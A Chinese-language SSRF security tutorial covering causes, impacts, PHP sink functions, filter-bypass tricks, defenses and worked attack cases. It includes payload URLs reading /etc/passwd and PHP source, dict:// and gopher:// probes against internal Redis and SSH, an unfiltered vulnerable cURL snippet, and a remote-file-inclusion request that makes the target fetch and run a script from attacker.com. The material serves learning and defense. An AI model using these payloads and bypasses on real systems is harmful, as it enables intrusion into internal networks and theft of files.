## 概述 (Overview)

SSRF (Server-Side Request Forgery) 是一种 Web 安全漏洞，允许攻击者诱导服务器端应用程序向攻击者指定的任意目标（可以是远程服务器、服务器自身或其内部网络）发起网络请求。许多 Web 应用需要从其他服务器获取数据（如加载图片、下载文件、获取网页内容），如果应用程序使用了用户可控的 URL 来执行这些操作，并且没有对该 URL 进行严格的验证和限制，就可能产生 SSRF 漏洞。

攻击者可以利用存在 SSRF 缺陷的 Web 应用作为 **代理** 或 **跳板 (stepping stone)** 来攻击通常无法从外部直接访问的内部系统或服务。

## 漏洞原理 (Vulnerability Principle)

*   **成因**: SSRF 漏洞的核心原因是服务器端代码 **接收了来自用户的输入**（通常是 URL 或其一部分），并 **使用该输入** 来构造并 **发起网络请求** 到另一个资源，同时 **缺乏对用户输入目标地址的充分过滤和限制**。
*   **场景**: 想象一个外网用户可以访问的网站 A，以及一个只有内部员工能访问的网站 B。如果网站 A 提供一个功能，允许用户输入 URL 来获取该 URL 的内容（例如，网页截图、加载远程图片），并且没有限制用户输入的 URL，那么攻击者就可以让网站 A 去请求网站 B 的资源。由于请求是由网站 A 的服务器发起的，它可以访问内部网络中的网站 B。
*   **关键问题**: 服务器信任了用户的输入，并代表用户向该输入指定的地址发起了请求，没有充分验证目标的合法性（是否是预期的外部资源，还是指向了内部网络或本地）。

## 危害与攻击用途 (Impact and Attack Purposes)

攻击者利用 SSRF 漏洞可以实现多种恶意目的，主要包括：

1.  **内网/本地端口扫描与服务发现**: 通过向不同的内部 IP 和端口发起请求，根据响应时间、状态码或错误信息判断端口是否开放，并可能获取服务 Banner 信息（版本号等）。
2.  **攻击内网/本地应用程序**:
    *   向内部存在的、未授权访问或存在漏洞的服务（如 Redis, Elasticsearch, Docker API, Struts2, WebLogic 等）发送构造的请求，可能导致命令执行、数据泄露或服务被利用。
    *   利用内部服务可能存在的溢出漏洞。
3.  **内网 Web 应用指纹识别**: 通过请求内部 Web 应用的默认路径、特定文件或目录，识别其使用的框架、CMS 或组件。
4.  **攻击内外网 Web 应用**: 利用 SSRF 发起 GET 请求（在某些情况下通过 `gopher://` 等协议可以发起 POST 等更复杂的请求），攻击目标 Web 应用存在的其他漏洞（如 SQL 注入、命令注入等）。
5.  **读取本地文件**: 利用 `file://` 协议读取服务器上的敏感文件（如配置文件、源代码、`/etc/passwd` 等），类似于本地文件包含 (LFI)。

## 常见触发点 (Common Trigger Points / Vulnerable Locations)

SSRF 漏洞可能出现在任何需要调用外部资源的功能点，特别是当资源的 URL 或其一部分由用户控制时：

*   **通过 URL 分享网页内容**: 如生成网页快照、提取文章标题/摘要。
*   **转码服务**: 如在线视频/音频转码。
*   **在线翻译**: 需要获取待翻译网页的内容。
*   **图片加载/下载/处理**: 通过 URL 上传图片、图片编辑、图片加水印。
*   **文章/图片收藏**: 需要从源 URL 获取内容。
*   **未公开的 API 或 Web Service 调用**: 后端服务之间通过 URL 进行交互。
*   **从 URL 进行资源订阅或数据同步**。

**寻找线索**: 留意 URL 参数中包含 URL 或主机名的关键字，例如：
`share`, `wap`, `url`, `link`, `src`, `source`, `target`, `u`, `3g`, `display`, `sourceURL`, `imageURL`, `domain` 等。

**示例**:
`http://example.com/loadImage?image=http://external-image.com/pic.jpg`
如果将 `image` 参数的值修改为内部 IP 地址或 `file://` 路径，例如：
`http://example.com/loadImage?image=http://192.168.1.100/admin`
`http://example.com/loadImage?image=file:///etc/passwd`
在存在 SSRF 漏洞的情况下，服务器会尝试请求这些内部资源或本地文件。通过观察响应（状态码、内容、错误信息），可以探测内部网络或读取文件。

## 常用后端实现及绕过技巧 (Common Backend Implementations and Bypass Techniques)

### 涉及的后端函数 (Relevant Backend Functions - PHP Focus)

SSRF 可能存在于任何后端语言中，在 PHP 代码审计时，需要特别关注以下可能发起网络请求的函数：

*   `curl_exec()`: 使用 cURL 库执行请求，支持多种协议。
*   `file_get_contents()`: 可以读取文件内容，也常用于发起 HTTP GET 请求。
*   `fsockopen()`: 打开一个网络连接或 Unix 套接字连接，可以进行更底层的 TCP/UDP 通信。
*   *(其他)*: `fopen()`, `readfile()`, `SoapClient::__call` (可触发 HTTP 请求), `SimpleXMLIterator` (可加载外部 DTD) 等。

### 绕过过滤 (Bypassing Filters)

开发者可能会尝试通过过滤 IP 地址或 URL scheme 来阻止 SSRF，但这些过滤常常可以被绕过：

*   **IP 地址表示法绕过 (Bypassing IP Address Filters using Different Notations)**:
    如果后端使用正则表达式（如 `^192\.168\.`, `^10\.`, `^172\.(1[6-9]|2\d|3[01])\.`）来阻止私有 IP 地址，可以尝试使用等效的不同 IP 表示法：
    *   **八进制**: `http://0300.0250.0.1` (等价于 `192.168.0.1`)
    *   **十六进制**: `http://0xC0.0xA8.0.1` (等价于 `192.168.0.1`)
    *   **十进制整数**: `http://3232235521` (等价于 `192.168.0.1`)
    *   **十六进制整数**: `http://0xC0A80001` (等价于 `192.168.0.1`)
    *   **混合进制**: `http://0xC0.168.0.1`
    *   **省略 0**: `http://192.168.1` (可能被解析为 `192.168.0.1`)

*   **URL 解析绕过 (Bypassing via URL Parsing Quirks)**:
    利用 URL 规范中的特性或后端库解析 URL 的差异。
    *   **使用 `@`**: `http://example.com@192.168.0.1` 或 `http://attacker.com#\@expected-domain.com/@192.168.1.1`。某些解析器可能错误地将 `@` 前的部分识别为主机名，而实际请求会发往 `@` 后的 IP 地址。
    *   **使用短网址服务**: 将恶意 URL (如 `http://127.0.0.1:6379`) 转换为短网址，可能绕过基于字符串匹配的过滤。
    *   **使用句号 `.` 代替 IP 地址**: `http://127.0.0.1./` -> `http://127.0.0.1/`
    *   **使用特殊域名**:
        *   `http://localhost` (通常解析为 `127.0.0.1` 或 `::1`)
        *   `http://[::]` (IPv6 回环地址)
        *   使用 `xip.io` 或 `nip.io` 等 DNS 服务: `http://10.0.0.1.xip.io` 会被解析为 `10.0.0.1`。
    *  **子域名绕过**: 例如禁止规则是URL必须以 https://website.thm 开头。攻击者可以通过在攻击者的域名上创建一个子域名来迅速绕过此规则，例如 https://website.thm.attackersdomain.thm 。此时，应用程序逻辑将允许此输入，并让攻击者控制内部HTTP请求。

*   **协议绕过**: 如果只过滤了 `http://` 或 `https://`，尝试使用 `file://`, `gopher://`, `dict://`, `ftp://`, `sftp://`, `tftp://`, `ldap://` 等其他协议。

*   **30x 跳转绕过**: 如果服务器会跟随 HTTP 跳转 (如 cURL 设置了 `CURLOPT_FOLLOWLOCATION`)，可以先提供一个看似合法的 URL，该 URL 配置为 301/302 跳转到内部或恶意的 URL。

* **DNS解析绕过**: 将被黑名单禁止的地址映射到DNS服务器上，然后访问域名解析出来的IP地址绕过黑名单。

## 防御措施 (Defense / Mitigation)

防御 SSRF 的核心是严格控制服务器发起的网络请求的目标。

1.  **首选：白名单策略 (Whitelist Strategy - Best Practice)**:
    *   只允许应用程序向预先定义好的、可信的域名或 IP 地址列表发起请求。这是最有效的防御方法。

2.  **过滤用户输入 (Filter User Input)**:
    *   严格校验用户提供的 URL 格式。
    *   解析 URL，获取主机名 (Host)。

3.  **限制协议 (Limit Protocols)**:
    *   仅允许应用程序实际需要的协议，通常是 HTTP 和 HTTPS。禁用其他如 `file://`, `gopher://`, `dict://`, `ftp://` 等危险协议。

4.  **过滤目标 IP 地址 (Filter Target IP Address)**:
    *   **解析域名获取 IP**: 对用户提供的 URL 中的域名进行 DNS 解析，获取其对应的 IP 地址。
    *   **校验 IP 归属**: 判断解析得到的 IP 是否为私有地址（如 `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`）、回环地址（`127.0.0.1`, `::1`）、或其他保留地址。如果是，则禁止请求。
    *   **注意**: 要处理好 DNS 解析可能返回多个 IP 的情况（包括 IPv4 和 IPv6）。要警惕 DNS Rebinding 攻击（攻击者控制的 DNS 服务器在 TTL 过期后返回不同的 IP 地址）。

5.  **统一错误消息**: 避免根据错误消息暴露过多关于内部网络状态的信息。

6.  **限制请求端口**: 如果可能，限制应用程序允许请求的目标端口（例如，只允许 80 和 443）。

7.  **禁用不必要的重定向跟随**: 例如在 cURL 中不设置 `CURLOPT_FOLLOWLOCATION`，或限制重定向次数。

8.  **内部服务加固 (Harden Internal Services)**:
    *   对内网服务（如 Redis, Memcached, Elasticsearch, MongoDB）进行身份验证、访问控制和网络隔离，即使被 SSRF 访问也无法轻易利用。

9.  **响应内容验证 (Validate Response Content)**:
    *   在某些情况下（如加载图片），可以检查返回内容的 `Content-Type` 或内容本身是否符合预期格式。

**处理无法使用白名单的情况 (Handling Cases Where Whitelists Are Impractical)**:
如果应用确实需要请求任意互联网资源（例如用户分享任意网页链接），防御策略应组合：
*   **禁用或限制重定向**。
*   **解析域名获取 IP，并严格过滤内部 IP 和保留地址**。
*   **限制允许的协议**。
*   **(可选) 限制允许的目标端口**。
*   **(可选) 对返回内容进行初步校验**。

## 攻击案例 (Attack Examples)

### 案例一：无过滤的 `curl` (Case 1: Unfiltered `curl`)

*   **源代码 (PHP)**:
    ```php
    <?php
    if (isset($_GET['url']) && $_GET['url'] != null) {
        // 接收前端 URL，但未做任何过滤，直接用于 cURL 请求
        $URL = $_GET['url'];
        $CH = curl_init($URL);
        curl_setopt($CH, CURLOPT_HEADER, FALSE);
        curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE); // 忽略 SSL 证书验证，有时也增加风险
        $RES = curl_exec($CH);
        curl_close($CH);
        // 将请求结果返回给前端
        echo $RES;
    }
    // curl 支持多种协议, 不仅仅是 http/https, 如 file, gopher, dict 等
    ?>
    ```
*   **漏洞利用**:
    *   **访问外部网站**: `http://vulnerable.com/ssrf_curl.php?url=http://www.baidu.com` -> 服务器请求百度并将结果返回。
    *   **读取本地文件**: `http://vulnerable.com/ssrf_curl.php?url=file:///etc/passwd` -> 服务器读取 `/etc/passwd` 文件内容并返回。
    *   **探测内网端口**: `http://vulnerable.com/ssrf_curl.php?url=http://192.168.1.1:80` -> 根据响应时间或内容判断内网主机 80 端口是否开放。

### 案例二：`file_get_contents` (Case 2: `file_get_contents`)

*   **场景**: 使用 `file_get_contents` 获取指定 URL 内容。此函数同样支持 `http://`, `https://`, `file://` 等协议（取决于 PHP 配置）。
*   **示例利用**: 假设目标脚本是 `ssrf_fgc.php`，它使用 `file_get_contents($_GET['file'])`。
    *   `http://vulnerable.com/ssrf_fgc.php?file=http://127.0.0.1/config.php` -> 尝试读取同服务器上的 `config.php` 文件（如果 Web 服务器配置允许通过 HTTP 访问）。
    *   `http://vulnerable.com/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=/var/www/html/db_conn.php` -> 结合 `php://filter` 读取 PHP 源码。

### 案例三：结合文件包含 (Case 3: Combining with File Inclusion)

*   **场景**: 目标存在文件包含漏洞（LFI/RFI），攻击者可以利用该漏洞包含一个托管在自己服务器上的脚本，该脚本执行 SSRF 扫描或攻击。
*   **步骤**:
    1.  **识别 LFI/RFI**: 发现 `http://vulnerable.com/rlfi.php?language=lang_en.php` 这样的参数。
    2.  **准备 SSRF 脚本**: 在攻击者服务器 (`http://attacker.com/`) 上放置一个 PHP 脚本 (`ssrf_scanner.php`)，该脚本接收 POST 参数 `target_ip`，并使用 `curl` 或 `fsockopen` 探测该 IP 的端口。
    3.  **触发包含与扫描**: 发送请求到 LFI/RFI 漏洞点，`language` 参数指向攻击者的脚本，并通过 POST 数据传递内部目标 IP。
        ```http
        POST /rlfi.php?language=http://attacker.com/ssrf_scanner.php&action=go HTTP/1.1
        Host: vulnerable.com
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 18

        target_ip=192.168.1.100
        ```
    4.  **获取结果**: `vulnerable.com` 服务器会下载并执行 `ssrf_scanner.php`，该脚本扫描内网的 `192.168.1.100`，并将结果输出到响应中。

## 利用其他协议 (Exploiting Other Protocols)

除了 `http/https` 和 `file`，其他协议在 SSRF 中也很有用：

*   **`dict://`**:
    *   **用途**: 用于访问字典服务器协议，常用来探测端口服务和版本信息。
    *   **示例**: `http://vulnerable.com/ssrf.php?url=dict://192.168.1.1:6379/info` -> 可能泄露内网 Redis 服务器的信息。 `dict://127.0.0.1:22/info` 可探测 SSH 版本。

*   **`gopher://`**:
    *   **用途**: 非常灵活，可以发送 **任意 TCP 流量** (包括非 HTTP 协议)。可以用来构造 POST 请求、攻击 Redis/Memcached/MySQL 等服务、发送 SMTP 邮件等。被称为 SSRF 中的 "万金油"。
    *   **格式**: `gopher://<host>:<port>/<gopher-path>`，其中 `<gopher-path>` 代表原始 TCP 数据流。
    *   **构造注意**:
        *   `<gopher-path>` 的第一个字符通常会被忽略，可以填充一个无用字符。
        *   回车换行符 (`\r\n`) 在 URL 编码时需要特别处理，通常需要进行 **两次 URL 编码** (CR=`%0d`, LF=`%0a` -> `%250d%250a`)。
    *   **示例 (构造 POST 请求)**:
        `http://vulnerable.com/ssrf.php?url=gopher://192.168.0.105:80/_POST%20/submit.php%20HTTP/1.1%0d%0aHost:%20192.168.0.105%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%207%0d%0a%0d%0aabc%3D123`
        (注意: 上述示例中的回车换行未二次编码，实际使用时需要二次编码)
    *   **更多 Gopher 攻击面**: 参考 [Gopher Attack Surfaces](https://blog.chaitin.cn/gopher-attack-surfaces/)。

*   **`ftp://`, `sftp://`, `tftp://`, `ldap://`**: 根据目标服务器支持情况和漏洞点实现，也可能被用于探测、数据传输或攻击特定服务。